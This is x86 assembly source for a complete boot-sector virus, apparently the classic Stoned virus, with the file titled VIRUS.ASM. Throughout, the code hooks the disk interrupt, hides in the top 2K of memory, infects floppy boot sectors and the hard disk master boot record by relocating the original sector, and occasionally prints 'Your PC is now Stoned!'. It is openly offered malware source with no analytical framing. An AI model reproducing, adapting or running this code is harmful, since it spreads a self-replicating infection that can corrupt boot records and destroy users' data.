               name    VIRUS
                page    55,132
                title   'VIRUS.ASM'

LOW_MEM         SEGMENT AT 0
                ORG     4*13h
INT13_OFF       LABEL   WORD

                ORG     (4*13h)+2
INT13_SEG       LABEL   WORD

                ORG     413h
MEM_SIZE        LABEL   WORD

                ORG     43Fh
FDD_STAT        LABEL   BYTE

                ORG     46Ch
TICK_VAL        LABEL   BYTE

                ORG     7C09h
OFF13_ADR       LABEL   WORD

                ORG     7C0Bh
SEG13_ADR       LABEL   WORD

                ORG     7C0Fh
TOP_SEG         LABEL   WORD

LOW_MEM         ENDS


LOAD_ADDR       SEGMENT PARA PUBLIC 'CODE'
                ASSUME  CS:LOAD_ADDR

                ORG     0
VIRUS_1         PROC    FAR
                JMP     FAR PTR VIRUS_2
VIRUS_1         ENDP

CSEG            SEGMENT BYTE PUBLIC 'CODE'
                ASSUME  CS:CSEG
                ORG     0
VIRUS_2         PROC    FAR
                JMP     C00A1

                ORG     8-5
D0008           DB      0

D0009           DD      0F000AF22h

D000D           DW      OFFSET C00E4
D000F           DW      9F80h

D0011           DW      07C00h
D0013           DW      0

                ORG     15h-5
C0015:          PUSH    DS
                PUSH    AX
                CMP     AH,2
                JB      C0033
                CMP     AH,4
                JNB     C0033

                OR      DL,DL
                JNZ     C0033

                ASSUME  DS:LOW_MEM

                XOR     AX,AX
                MOV     DS,AX
                MOV     AL,FDD_STAT
                TEST    AL,1
                JNZ     C0033

                CALL    C003A
C0033:          POP     AX
                POP     DS
                JMP     CS:[D0009]


C003A           PROC    NEAR
                PUSH    BX
                PUSH    CX
                PUSH    DX
                PUSH    ES
                PUSH    SI
                PUSH    DI
                MOV     SI,4

C0043:          MOV     AX,201h
                PUSH    CS
                POP     ES
                MOV     BX,200h
                XOR     CX,CX
                MOV     DX,CX
                INC     CX
                PUSHF
                CALL    CS:[D0009]
                  JNB     C0066

                XOR     AX,AX
                PUSHF
                CALL    CS:[D0009]
                DEC     SI
                JNZ     C0043
                JMP     SHORT C009A


C0065:          NOP
C0066:          XOR     SI,SI
                MOV     DI,200h
                CLD
                PUSH    CS
                POP     DS
                LODSW
                CMP     AX,[DI]
                JNZ     C0079

                LODSW
                CMP     AX,[DI+2]
                JZ      C009A

C0079:          MOV     AX,301h
                MOV     BX,200h
                MOV     CL,3
                MOV     DH,1
                PUSHF
                CALL    CS:[D0009]
                JB      C009A

                MOV     AX,301h
                XOR     BX,BX
                MOV     CL,1
                XOR     DX,DX
                PUSHF
                CALL    CS:[D0009]
C009A:          POP     DI
                POP     SI
                POP     ES
                POP     DX
                POP     CX
                POP     BX
                RET
C003A           ENDP


C00A1:          XOR     AX,AX
                MOV     DS,AX
                CLI
                MOV     SS,AX
                MOV     SP,7C00h
                STI

                MOV     AX,INT13_OFF    ; OFFSET OF INT 13h
                MOV     OFF13_ADR,AX    ; TO CS:9
                MOV     AX,INT13_SEG    ; SEGMENT OF INT 13h
                MOV     SEG13_ADR,AX    ; TO CS:0Bh

                MOV     AX,MEM_SIZE     ; SIZE OF MEMORY
                DEC     AX              ; DECREMENT SIZE OF
                DEC     AX              ; MEMORY BY 2K
                MOV     MEM_SIZE,AX     ; SAVE NEW SIZE

                MOV     CL,6
                SHL     AX,CL
                MOV     ES,AX           ; SEG OF TOP 2K TO ES
                MOV     TOP_SEG,AX      ; ALSO TO CS:0Fh
                MOV     AX,15h          ; OFFSET OF NEW INT
                MOV     INT13_OFF,AX    ; 13h
                MOV     INT13_SEG,ES    ; SEG OF NEW INT 13h

                MOV     CX,OFFSET D01B8
                PUSH    CS
                POP     DS
                XOR     SI,SI
                MOV     DI,SI
                CLD
                REP     MOVSB
                JMP     CS:[DWORD PTR D000D]
VIRUS_2         ENDP


                ORG     0E4h-5
C00E4           PROC    FAR
                MOV     AX,0
                INT     13h
                XOR     AX,AX
                MOV     ES,AX
                MOV     AX,201h
                MOV     BX,7C00h
                CMP     CS:[D0008],0
                JZ      C0106

                MOV     CX,7
                MOV     DX,80h
                INT     13h
                JMP     SHORT C014E


C0105:          NOP
C0106:          MOV     CX,3
                MOV     DX,100h
                INT     13h
                JB      C014E

                TEST    ES:[TICK_VAL],7
                JNZ     C012A

                MOV     SI,OFFSET D0189
                PUSH    CS
                POP     DS
C011D:          LODSB
                OR      AL,AL
                JZ      C012A

                MOV     AH,0Eh
                MOV     BH,0
                INT     10h
                JMP     C011D

C012A:          PUSH    CS
                POP     ES
                MOV     AX,201h
                MOV     BX,200h
                MOV     CL,1
                MOV     DX,80h
                INT     13h
                JB      C014E

                PUSH    CS
                POP     DS
                MOV     SI,200h
                MOV     DI,0
                LODSW
                CMP     AX,[DI]
                JNZ     C0159

                LODSW
                CMP     AX,[DI+2]
                JNZ     C0159

C014E:          MOV     CS:[D0008],0
                JMP     CS:[DWORD PTR D0011]


C0159:          MOV     CS:[D0008],2
                MOV     AX,301h
                MOV     BX,200h
                MOV     CX,7
                MOV     DX,80h
                INT     13h
                JB      C014E

                PUSH    CS
                POP     DS
               PUSH    CS
                POP     ES
                MOV     SI,OFFSET D01BE+200h
                MOV     DI,OFFSET D01BE
                MOV     CX,242h
                REP     MOVSB
                MOV     AX,301h
                XOR     BX,BX
                INC     CL
                INT     13h
                JMP     C014E
C00E4           ENDP


                ORG     189h-5
D0189           DB      7
D018A           DB      'Your PC is now Stoned!'
D01A0           DB      7,13,10,10,0
D01A5           DB      'LEGALISE MARIJUANA!'
D01B8           DB      6 DUP (0)
D01BE           DB      80h,1,1,0,6,5,0D1h,32h
D01C6           DB      11h,0,0,0,41h,46h,1

                ORG     1FEh-5
                DW      0AA55h

CSEG            ENDS
LOAD_ADDR       ENDS
                END     VIRUS_1

